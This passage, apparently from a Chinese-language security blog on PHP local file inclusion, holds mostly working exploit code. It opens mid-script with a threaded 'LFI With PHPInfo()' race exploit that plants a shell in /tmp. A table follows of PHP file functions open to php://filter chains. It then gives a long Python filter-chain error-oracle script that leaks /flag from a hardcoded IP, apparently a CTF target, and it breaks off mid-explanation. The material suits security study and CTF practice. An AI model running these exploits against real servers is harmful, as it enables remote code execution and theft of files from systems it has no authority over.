    s<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
    s2<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token keyword">if</span> d<span class="token punctuation">.</span>find<span class="token punctuation">(</span>tag<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> fn

counter <span class="token operator">=</span> <span class="token number">0</span>
<span class="token keyword">class</span> <span class="token class-name">ThreadWorker</span><span class="token punctuation">(</span>threading<span class="token punctuation">.</span>Thread<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> e<span class="token punctuation">,</span> l<span class="token punctuation">,</span> m<span class="token punctuation">,</span> <span class="token operator">*</span>args<span class="token punctuation">)</span><span class="token punctuation">:</span>
        threading<span class="token punctuation">.</span>Thread<span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>self<span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>event <span class="token operator">=</span> e
        self<span class="token punctuation">.</span>lock <span class="token operator">=</span> l
        self<span class="token punctuation">.</span>maxattempts <span class="token operator">=</span> m
        self<span class="token punctuation">.</span>args <span class="token operator">=</span> args

    <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">global</span> counter
        <span class="token keyword">while</span> <span class="token keyword">not</span> self<span class="token punctuation">.</span>event<span class="token punctuation">.</span>is_set<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">with</span> self<span class="token punctuation">.</span>lock<span class="token punctuation">:</span>
                <span class="token keyword">if</span> counter <span class="token operator">>=</span> self<span class="token punctuation">.</span>maxattempts<span class="token punctuation">:</span>
                    <span class="token keyword">return</span>
                counter <span class="token operator">+=</span> <span class="token number">1</span>

            <span class="token keyword">try</span><span class="token punctuation">:</span>
                x <span class="token operator">=</span> phpInfoLFI<span class="token punctuation">(</span><span class="token operator">*</span>self<span class="token punctuation">.</span>args<span class="token punctuation">)</span>
                <span class="token keyword">if</span> self<span class="token punctuation">.</span>event<span class="token punctuation">.</span>is_set<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                    <span class="token keyword">break</span>                
                <span class="token keyword">if</span> x<span class="token punctuation">:</span>
                    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\nGot it! Shell created in /tmp/g"</span><span class="token punctuation">)</span>
                    self<span class="token punctuation">.</span>event<span class="token punctuation">.</span><span class="token builtin">set</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
                    
            <span class="token keyword">except</span> socket<span class="token punctuation">.</span>error<span class="token punctuation">:</span>
                <span class="token keyword">return</span>
    

<span class="token keyword">def</span> <span class="token function">getOffset</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">,</span> phpinforeq<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">"""Gets offset of tmp_name in the php output"""</span>
    s <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>
    s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">)</span>
    s<span class="token punctuation">.</span>send<span class="token punctuation">(</span>phpinforeq<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    
    d <span class="token operator">=</span> <span class="token string">b""</span>
    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
        i <span class="token operator">=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4096</span><span class="token punctuation">)</span>
        d <span class="token operator">+=</span> i        
        <span class="token keyword">if</span> i <span class="token operator">==</span> <span class="token string">b""</span><span class="token punctuation">:</span>
            <span class="token keyword">break</span>
        <span class="token comment"># detect the final chunk</span>
        <span class="token keyword">if</span> i<span class="token punctuation">.</span>endswith<span class="token punctuation">(</span><span class="token string">b"0\r\n\r\n"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">break</span>
    s<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
    i <span class="token operator">=</span> d<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">b"[tmp_name] =&amp;gt; "</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> i <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>
        <span class="token keyword">raise</span> ValueError<span class="token punctuation">(</span><span class="token string">"No php tmp_name in phpinfo output"</span><span class="token punctuation">)</span>
    
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"found %s at %i"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>d<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i<span class="token operator">+</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token comment"># padded up a bit</span>
    <span class="token keyword">return</span> i <span class="token operator">+</span> <span class="token number">256</span>

<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"LFI With PHPInfo()"</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"-="</span> <span class="token operator">*</span> <span class="token number">30</span><span class="token punctuation">)</span>

    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">2</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Usage: %s host [port] [threads]"</span> <span class="token operator">%</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>

    <span class="token keyword">try</span><span class="token punctuation">:</span>
        host <span class="token operator">=</span> socket<span class="token punctuation">.</span>gethostbyname<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token keyword">except</span> socket<span class="token punctuation">.</span>error <span class="token keyword">as</span> e<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Error with hostname %s: %s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> e<span class="token punctuation">)</span><span class="token punctuation">)</span>
        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>

    port <span class="token operator">=</span> <span class="token number">80</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        port <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token keyword">except</span> IndexError<span class="token punctuation">:</span>
        <span class="token keyword">pass</span>
    <span class="token keyword">except</span> ValueError <span class="token keyword">as</span> e<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Error with port %d: %s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> e<span class="token punctuation">)</span><span class="token punctuation">)</span>
        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
    
    poolsz <span class="token operator">=</span> <span class="token number">10</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        poolsz <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token keyword">except</span> IndexError<span class="token punctuation">:</span>
        <span class="token keyword">pass</span>
    <span class="token keyword">except</span> ValueError <span class="token keyword">as</span> e<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Error with poolsz %d: %s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span> e<span class="token punctuation">)</span><span class="token punctuation">)</span>
        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>

    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Getting initial offset..."</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">' '</span><span class="token punctuation">)</span>  
    reqphp<span class="token punctuation">,</span> tag<span class="token punctuation">,</span> reqlfi <span class="token operator">=</span> setup<span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">)</span>
    offset <span class="token operator">=</span> getOffset<span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">,</span> reqphp<span class="token punctuation">)</span>
    sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>flush<span class="token punctuation">(</span><span class="token punctuation">)</span>

    maxattempts <span class="token operator">=</span> <span class="token number">1000</span>
    e <span class="token operator">=</span> threading<span class="token punctuation">.</span>Event<span class="token punctuation">(</span><span class="token punctuation">)</span>
    l <span class="token operator">=</span> threading<span class="token punctuation">.</span>Lock<span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Spawning worker pool (%d)..."</span> <span class="token operator">%</span> poolsz<span class="token punctuation">)</span>
    sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>flush<span class="token punctuation">(</span><span class="token punctuation">)</span>

    tp <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> poolsz<span class="token punctuation">)</span><span class="token punctuation">:</span>
        tp<span class="token punctuation">.</span>append<span class="token punctuation">(</span>ThreadWorker<span class="token punctuation">(</span>e<span class="token punctuation">,</span> l<span class="token punctuation">,</span> maxattempts<span class="token punctuation">,</span> host<span class="token punctuation">,</span> port<span class="token punctuation">,</span> reqphp<span class="token punctuation">,</span> offset<span class="token punctuation">,</span> reqlfi<span class="token punctuation">,</span> tag<span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token keyword">for</span> t <span class="token keyword">in</span> tp<span class="token punctuation">:</span>
        t<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        <span class="token keyword">while</span> <span class="token keyword">not</span> e<span class="token punctuation">.</span>wait<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span> e<span class="token punctuation">.</span>is_set<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                <span class="token keyword">break</span>
            <span class="token keyword">with</span> l<span class="token punctuation">:</span>
                sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">"\r% 4d / % 4d"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>counter<span class="token punctuation">,</span> maxattempts<span class="token punctuation">)</span><span class="token punctuation">)</span>
                sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>flush<span class="token punctuation">(</span><span class="token punctuation">)</span>
                <span class="token keyword">if</span> counter <span class="token operator">>=</span> maxattempts<span class="token punctuation">:</span>
                    <span class="token keyword">break</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> e<span class="token punctuation">.</span>is_set<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Woot!  \m/"</span><span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">":("</span><span class="token punctuation">)</span>
            exit<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">except</span> KeyboardInterrupt<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\nTelling threads to shutdown..."</span><span class="token punctuation">)</span>
        e<span class="token punctuation">.</span><span class="token builtin">set</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Shuttin' down..."</span><span class="token punctuation">)</span>
    <span class="token keyword">for</span> t <span class="token keyword">in</span> tp<span class="token punctuation">:</span>
        t<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
    main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<hr>
<h1 id="FilterChain"><a href="#FilterChain" class="headerlink" title="FilterChain"></a>FilterChain</h1><p>以下方法受影响的函数均为<strong>文件系统函数</strong>，这里补充了一些受影响的类</p>
<table>
<thead>
<tr>
<th><strong>Function</strong></th>
<th><strong>Pattern</strong></th>
</tr>
</thead>
<tbody><tr>
<td><em><strong>file_get_contents</strong></em></td>
<td><code>file_get_contents($_POST[0]);</code></td>
</tr>
<tr>
<td><em><strong>readfile</strong></em></td>
<td><code>readfile($_POST[0]);</code></td>
</tr>
<tr>
<td><em><strong>finfo-&gt;file</strong></em></td>
<td><code>$file = new finfo(); $fileinfo = $file-&gt;file($_POST[0], FILEINFO_MIME);</code></td>
</tr>
<tr>
<td><em><strong>getimagesize</strong></em></td>
<td><code>getimagesize($_POST[0]);</code></td>
</tr>
<tr>
<td><em><strong>md5_file</strong></em></td>
<td><code>md5_file($_POST[0]);</code></td>
</tr>
<tr>
<td><em><strong>sha1_file</strong></em></td>
<td><code>sha1_file($_POST[0]);</code></td>
</tr>
<tr>
<td><em><strong>hash_file</strong></em></td>
<td><code>hash_file(&#39;md5&#39;, $_POST[0]);</code></td>
</tr>
<tr>
<td><em><strong>file</strong></em></td>
<td><code>file($_POST[0]);</code></td>
</tr>
<tr>
<td><em><strong>parse_ini_file</strong></em></td>
<td><code>parse_ini_file($_POST[0]);</code></td>
</tr>
<tr>
<td><em><strong>copy</strong></em></td>
<td><code>copy($_POST[0], &#39;/tmp/test&#39;);</code></td>
</tr>
<tr>
<td><em><strong>file_put_contents (only target read only with error-based oracle)</strong></em></td>
<td><code>file_put_contents($_POST[0], &quot;&quot;);</code></td>
</tr>
<tr>
<td><em><strong>file_put_contents (filter for filename and data for content with cnext)</strong></em></td>
<td><code>file_put_contents($_POST[0], $_POST[1]);</code></td>
</tr>
<tr>
<td><em><strong>stream_get_contents</strong></em></td>
<td><code>$file = fopen($_POST[0], &quot;r&quot;); stream_get_contents($file);</code></td>
</tr>
<tr>
<td><em><strong>fgets</strong></em></td>
<td><code>$file = fopen($_POST[0], &quot;r&quot;); fgets($file);</code></td>
</tr>
<tr>
<td><em><strong>fread</strong></em></td>
<td><code>$file = fopen($_POST[0], &quot;r&quot;); fread($file, 10000);</code></td>
</tr>
<tr>
<td><em><strong>fgetc</strong></em></td>
<td><code>$file = fopen($_POST[0], &quot;r&quot;); fgetc($file);</code></td>
</tr>
<tr>
<td><em><strong>fgetcsv</strong></em></td>
<td><code>$file = fopen($_POST[0], &quot;r&quot;); fgetcsv($file, 1000, &quot;,&quot;);</code></td>
</tr>
<tr>
<td><em><strong>fpassthru</strong></em></td>
<td><code>$file = fopen($_POST[0], &quot;r&quot;); fpassthru($file);</code></td>
</tr>
<tr>
<td><em><strong>fputs</strong></em></td>
<td><code>$file = fopen($_POST[0], &quot;rw&quot;); fputs($file, 0);</code></td>
</tr>
<tr>
<td><em><strong>SplFileObject-&gt;read()</strong></em></td>
<td><code>$file = new SplFileObject($_POST[0]);</code></td>
</tr>
<tr>
<td><em><strong>CURLFile</strong></em></td>
<td><code>$file = new CURLFile($_POST[0]);</code></td>
</tr>
</tbody></table>
<h2 id="The-End-of-LFI"><a href="#The-End-of-LFI" class="headerlink" title="The End of LFI"></a>The End of LFI</h2><p>并非end（</p>
<p><a href="/blog/2023/11/24/FilterChain/">链接</a></p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">import requests
import sys
from base64 import b64decode

<span class="token string double-quoted-string">""</span><span class="token string double-quoted-string">"
THE GRAND IDEA:
We can use PHP memory limit as an error oracle. Repeatedly applying the convert.iconv.L1.UCS-4LE
filter will blow up the string length by 4x every time it is used, which will quickly cause
500 error if and only if the string is non empty. So we now have an oracle that tells us if
the string is empty.

THE GRAND IDEA 2:
The dechunk filter is interesting.
https://github.com/php/php-src/blob/01b3fc03c30c6cb85038250bb5640be3a09c6a32/ext/standard/filters.c#L1724
It looks like it was implemented for something http related, but for our purposes, the interesting
behavior is that if the string contains no newlines, it will wipe the entire string if and only if
the string starts with A-Fa-f0-9, otherwise it will leave it untouched. This works perfect with our
above oracle! In fact we can verify that since the flag starts with D that the filter chain

dechunk|convert.iconv.L1.UCS-4LE|convert.iconv.L1.UCS-4LE|[...]|convert.iconv.L1.UCS-4LE

does not cause a 500 error.

THE REST:
So now we can verify if the first character is in A-Fa-f0-9. The rest of the challenge is a descent
into madness trying to figure out ways to:
- somehow get other characters not at the start of the flag file to the front
- detect more precisely which character is at the front
"</span><span class="token string double-quoted-string">""</span>

def <span class="token function">join</span><span class="token punctuation">(</span><span class="token operator">*</span>x<span class="token punctuation">)</span><span class="token punctuation">:</span>
	<span class="token keyword">return</span> <span class="token string single-quoted-string">'|'</span><span class="token operator">.</span><span class="token function">join</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span>

def <span class="token function">err</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>
	<span class="token keyword">print</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span>
	raise ValueError

def <span class="token function">req</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>
	<span class="token class-name return-type">data</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
		<span class="token string single-quoted-string">'my[secret.flag'</span><span class="token punctuation">:</span><span class="token string single-quoted-string">'C:8:"Saferman":0:&#123;&#125;'</span><span class="token punctuation">,</span>
		<span class="token string single-quoted-string">'secret'</span><span class="token punctuation">:</span> f<span class="token string single-quoted-string">'php://filter/&#123;s&#125;/resource=/flag'</span>
	<span class="token punctuation">&#125;</span>
	r<span class="token operator">=</span>requests<span class="token operator">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'http://39.105.5.7:47698/'</span><span class="token punctuation">,</span> params<span class="token operator">=</span>data<span class="token punctuation">)</span>
	<span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token operator">.</span>status_code<span class="token punctuation">)</span>
	<span class="token keyword">return</span> r<span class="token operator">.</span>status_code <span class="token operator">==</span> <span class="token number">500</span>


<span class="token string double-quoted-string">""</span><span class="token string double-quoted-string">"
Step 1:
The second step of our exploit only works under two conditions:
- String only contains a-zA-Z0-9
- String ends with two equals signs

base64-encoding the flag file twice takes care of the first condition.

We don't know the length of the flag file, so we can't be sure that it will end with two equals
signs.

Repeated application of the convert.quoted-printable-encode will only consume additional
memory if the base64 ends with equals signs, so that's what we are going to use as an oracle here.
If the double-base64 does not end with two equals signs, we will add junk data to the start of the
flag with convert.iconv..CSISO2022KR until it does.
"</span><span class="token string double-quoted-string">""</span>

blow_up_enc <span class="token operator">=</span> <span class="token function">join</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'convert.quoted-printable-encode'</span><span class="token punctuation">]</span><span class="token operator">*</span><span class="token number">1000</span><span class="token punctuation">)</span>
blow_up_utf32 <span class="token operator">=</span> <span class="token string single-quoted-string">'convert.iconv.L1.UCS-4LE'</span>
blow_up_inf <span class="token operator">=</span> <span class="token function">join</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">[</span>blow_up_utf32<span class="token punctuation">]</span><span class="token operator">*</span><span class="token number">50</span><span class="token punctuation">)</span>

header <span class="token operator">=</span> <span class="token string single-quoted-string">'convert.base64-encode|convert.base64-encode'</span>

<span class="token comment"># Start get baseline blowup</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Calculating blowup'</span><span class="token punctuation">)</span>
baseline_blowup <span class="token operator">=</span> <span class="token number">0</span>
<span class="token keyword">for</span> n in <span class="token function">range</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
	<span class="token class-name return-type">payload</span> <span class="token operator">=</span> <span class="token function">join</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">[</span>blow_up_utf32<span class="token punctuation">]</span><span class="token operator">*</span>n<span class="token punctuation">)</span>
	<span class="token keyword">if</span> <span class="token function">req</span><span class="token punctuation">(</span>f<span class="token string single-quoted-string">'&#123;header&#125;|&#123;payload&#125;'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
		<span class="token class-name return-type">baseline_blowup</span> <span class="token operator">=</span> n
		<span class="token keyword">break</span>
<span class="token keyword">else</span><span class="token punctuation">:</span>
	<span class="token function">err</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'something wrong'</span><span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span>f<span class="token string single-quoted-string">'baseline blowup is &#123;baseline_blowup&#125;'</span><span class="token punctuation">)</span>

trailer <span class="token operator">=</span> <span class="token function">join</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">[</span>blow_up_utf32<span class="token punctuation">]</span><span class="token operator">*</span><span class="token punctuation">(</span>baseline_blowup<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

assert <span class="token function">req</span><span class="token punctuation">(</span>f<span class="token string single-quoted-string">'&#123;header&#125;|&#123;trailer&#125;'</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token constant boolean">False</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'detecting equals'</span><span class="token punctuation">)</span>
j <span class="token operator">=</span> <span class="token punctuation">[</span>
	<span class="token function">req</span><span class="token punctuation">(</span>f<span class="token string single-quoted-string">'convert.base64-encode|convert.base64-encode|&#123;blow_up_enc&#125;|&#123;trailer&#125;'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
	<span class="token function">req</span><span class="token punctuation">(</span>f<span class="token string single-quoted-string">'convert.base64-encode|convert.iconv..CSISO2022KR|convert.base64-encode&#123;blow_up_enc&#125;|&#123;trailer&#125;'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
	<span class="token function">req</span><span class="token punctuation">(</span>f<span class="token string single-quoted-string">'convert.base64-encode|convert.iconv..CSISO2022KR|convert.iconv..CSISO2022KR|convert.base64-encode|&#123;blow_up_enc&#125;|&#123;trailer&#125;'</span><span class="token punctuation">)</span>
<span class="token punctuation">]</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>
<span class="token keyword">if</span> <span class="token function">sum</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">2</span><span class="token punctuation">:</span>
	<span class="token function">err</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'something wrong'</span><span class="token punctuation">)</span>
<span class="token keyword">if</span> j<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token constant boolean">False</span><span class="token punctuation">:</span>
	header <span class="token operator">=</span> f<span class="token string single-quoted-string">'convert.base64-encode|convert.iconv..CSISO2022KR|convert.base64-encode'</span>
elif j<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token constant boolean">False</span><span class="token punctuation">:</span>
	header <span class="token operator">=</span> f<span class="token string single-quoted-string">'convert.base64-encode|convert.iconv..CSISO2022KR|convert.iconv..CSISO2022KRconvert.base64-encode'</span>
elif j<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token constant boolean">False</span><span class="token punctuation">:</span>
	header <span class="token operator">=</span> f<span class="token string single-quoted-string">'convert.base64-encode|convert.base64-encode'</span>
<span class="token keyword">else</span><span class="token punctuation">:</span>
	<span class="token function">err</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'something wrong'</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>f<span class="token string single-quoted-string">'j: &#123;j&#125;'</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>f<span class="token string single-quoted-string">'header: &#123;header&#125;'</span><span class="token punctuation">)</span>

<span class="token string double-quoted-string">""</span><span class="token string double-quoted-string">"
Step two:
Now we have something of the form
[a-zA-Z0-9 things]==

Here the pain begins. For a long time I was trying to find something that would allow me to strip
successive characters from the start of the string to access every character. Maybe something like
that exists but I couldn't find it. However, if you play around with filter combinations you notice
there are filters that *swap* characters:

convert.iconv.CSUNICODE.UCS-2BE, which I call r2, flips every pair of characters in a string:
abcdefgh -> badcfehg

convert.iconv.UCS-4LE.10646-1:1993, which I call r4, reverses every chunk of four characters:
abcdefgh -> dcbahgfe

This allows us to access the first four characters of the string. Can we do better? It turns out
YES, we can! Turns out that convert.iconv.CSUNICODE.CSUNICODE appends &lt;0xff>&lt;0xfe> to the start of
the string:

abcdefgh -> &lt;0xff>&lt;0xfe>abcdefgh

The idea being that if we now use the r4 gadget, we get something like:
ba&lt;0xfe>&lt;0xff>fedc

And then if we apply a convert.base64-decode|convert.base64-encode, it removes the invalid
&lt;0xfe>&lt;0xff> to get:
bafedc

And then apply the r4 again, we have swapped the f and e to the front, which were the 5th and 6th
characters of the string. There's only one problem: our r4 gadget requires that the string length
is a multiple of 4. The original base64 string will be a multiple of four by definition, so when
we apply convert.iconv.CSUNICODE.CSUNICODE it will be two more than a multiple of four, which is no
good for our r4 gadget. This is where the double equals we required in step 1 comes in! Because it
turns out, if we apply the filter
convert.quoted-printable-encode|convert.quoted-printable-encode|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.L1.utf7

It will turn the == into:
+---AD0-3D3D+---AD0-3D3D

And this is magic, because this corrects such that when we apply the
convert.iconv.CSUNICODE.CSUNICODE filter the resuting string is exactly a multiple of four!

Let's recap. We have a string like:
abcdefghij==

Apply the convert.quoted-printable-encode + convert.iconv.L1.utf7:
abcdefghij+---AD0-3D3D+---AD0-3D3D

Apply convert.iconv.CSUNICODE.CSUNICODE:
&lt;0xff>&lt;0xfe>abcdefghij+---AD0-3D3D+---AD0-3D3D

Apply r4 gadget:
ba&lt;0xfe>&lt;0xff>fedcjihg---+-0DAD3D3---+-0DAD3D3

Apply base64-decode | base64-encode, so the '-' and high bytes will disappear:
bafedcjihg+0DAD3D3+0DAD3Dw==

Then apply r4 once more:
